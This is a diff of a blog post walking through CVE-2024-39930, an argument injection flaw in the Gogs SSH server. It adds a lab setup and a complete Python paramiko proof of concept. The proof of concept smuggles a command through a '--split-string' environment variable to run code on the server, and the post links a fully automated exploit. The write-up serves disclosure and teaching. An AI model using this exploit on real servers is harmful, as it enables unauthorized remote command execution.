@@ -115,11 +115,11 @@ export: usage: export [-fn] [name[=value] ...] or export -p
 ### Bypassing OS level Environment Variable restriction
 In typical scenarios, the SSH client picks up environment variables from the local system and sends them to the server only if explicitly allowed. But what if we could bypass this behavior entirely?
 
-Instead of relying on the client to **automatically fetch** environment variables from the system, we can try to **directly provide** the SSH client with the exact environment variable we want it to send. This would allow us to inject malicious values, such as `--split-string`, even though the name itself is not valid as a system environment variable.
+Instead of relying on the client to **automatically fetch** environment variables from the system, we can try to directly provide the SSH client with the exact environment variable we want it to send. This would allow us to inject malicious values, such as `--split-string`, even though the name itself is not valid as a system environment variable.
 
 By manually crafting the SSH request or using a custom SSH client that supports arbitrary `env` requests, we can override the default behavior and **inject environment variables that would otherwise be blocked** at the OS level. This opens the door to argument injection, even in restrictive environments.
 
-Buckle up! In the next section, we’ll walk through crafting a working exploit to leverage this vulnerability in Gogs.
+Buckle up! In the next sections, we’ll walk through crafting a working exploit to leverage this vulnerability in `Gogs`.
 
 ### Setting up Gogs enviroment
 For readers who would like to replicate this vulnerability, I’ve created a quick automated script that sets up a vulnerable `Gogs` instance. This allows you to focus entirely on exploitation without getting bogged down in the setup process.
@@ -131,7 +131,7 @@ You can access the script here: [Download gogs_install.sh](#)
 1. **Start with a fresh VM instance.**
 2. **Place** the `gogs_install.sh` script in the `/root` directory.
 3. **Make it executable**:
-   ```
+  ```
   chmod +x /root/gogs_install.sh
   ```
 4. Run the script and wait for it to complete:
@@ -156,8 +156,130 @@ Paste your **SSH public key** into the provided field and give it a descriptive 
 
 Once the key is added, your account is ready to authenticate over SSH.
 
+Lastly, we’ll need to create a new repository in Gogs that we can interact with over **Git-over-SSH**.
+
+![Gogs Repo Create](git_repo_created_and_Git_over_SSH.png)
+
+As shown in the image above, after creating a repository, Gogs provides an SSH URL which allows us to push and pull from the repo using the SSH protocol. This is exactly what we need to trigger and test the argument injection vulnerability.
+
 ---
 
 With our environment set up and SSH access configured, we can now move on to developing exploit code to target this vulnerability.
 
 ### Developing a Proof of Concept
+Even though the operating system restricts us from setting environment variables with invalid names (such as those starting with a dash), we can work around this limitation by using Python’s `paramiko` module to build a custom SSH client.
+
+With `paramiko`, we can programmatically send custom environment variables during the SSH session by using the [`set_environment_variable()`](https://docs.paramiko.org/en/stable/api/channel.html#paramiko.channel.Channel.set_environment_variable) method. This method takes two arguments:
+
+- The **environment variable name**
+- The **environment variable value**
+
+To demonstrate this vulnerability, we'll build a simple SSH client using Python's `paramiko` library. This allows us to send custom environment variables using the `set_environment_variable()` method—something standard SSH clients typically restrict.
+
+---
+
+#### Step 1: Connect to the Target via SSH
+
+Start by establishing an SSH connection to the target Gogs server:
+
+```python
+import paramiko
+
+key = paramiko.RSAKey.from_private_key_file("/path/to/private/key") # Path to the private key
+client = paramiko.SSHClient()
+client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+client.connect(
+    hostname="172.16.73.143",
+    port=2222, # Custom port used by Gogs' in-built SSH server
+    username="mcsam", # Gogs username
+    pkey=key
+)
+```
+
+#### Step 2: Open a Session and Send the Malicious env Request
+
+After connecting, open a new SSH session. Then, send a malicious environment variable using the `--split-string` option, which allows us to pass a command that gets executed on the server.
+
+```python
+session = client.get_transport().open_session()
+
+# Inject the malicious environment variable
+session.set_environment_variable("--split-string", "touch /tmp/pwneeeddddddddddd")
+
+# Trigger Git-over-SSH with a valid repo path
+session.exec_command("git-upload-pack /<user>/<repo>.git")
+```
+
+#### Step 3: Capture Output and Close the Session
+
+Capture the output streams to observe results or errors from the command execution:
+
+```python
+stdout = session.makefile('rb', 1024)
+stderr = session.makefile_stderr('rb', 1024)
+
+print("[+] STDOUT:")
+print(stdout.read().decode())
+
+print("[!] STDERR:")
+print(stderr.read().decode())
+
+session.close()
+client.close()
+```
+
+#### Step 4: Final Combined Script
+
+Here’s the complete PoC, with placeholders to be replaced:
+```python
+import paramiko
+
+key = paramiko.RSAKey.from_private_key_file("./id_rsa")
+client = paramiko.SSHClient()
+client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+client.connect(
+    hostname="172.16.73.143",
+    port=2222,
+    username="mcsam",
+    pkey=key
+)
+
+session = client.get_transport().open_session()
+
+session.set_environment_variable("--split-string", "touch /tmp/pwneeeddddddddddd")
+session.exec_command("git-upload-pack /mcsam/test.git")
+
+stdout = session.makefile('rb', 1024)
+stderr = session.makefile_stderr('rb', 1024)
+
+print("[+] STDOUT:")
+print(stdout.read().decode())
+
+print("[!] STDERR:")
+print(stderr.read().decode())
+
+session.close()
+client.close()
+```
+
+If everything works as expected, the exploit will run without errors, and the file `/tmp/pwneeeddddddddddd` will be created on the target server, confirming that command execution was successful.
+
+## Verifying / Testing the Exploit
+
+In the video below, I demonstrate a proof-of-concept exploit for the Gogs vulnerability (CVE-2024-39930):
+
+
+<iframe width="1043" height="572" src="https://www.youtube.com/embed/ylQUgvktiMM" title="CVE-2024-39930 PoC gogs RCE exploitation" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+
+
+For convenience, I’ve also created a fully automated exploit script that handles everything — from uploading SSH keys to creating a repository and executing the payload.
+
+You can find the full exploit code on GitHub:  
+🔗 [theMcSam/CVE-2024-39930-PoC](https://github.com/theMcSam/CVE-2024-39930-PoC)
+
+## References
+- https://github.com/advisories/GHSA-vm62-9jw3-c8w3
+- https://www.sonarsource.com/blog/securing-developer-tools-unpatched-code-vulnerabilities-in-gogs-1/
+- https://www.vicarius.io/vsociety/posts/argument-injection-in-gogs-ssh-server-cve-2024-39930
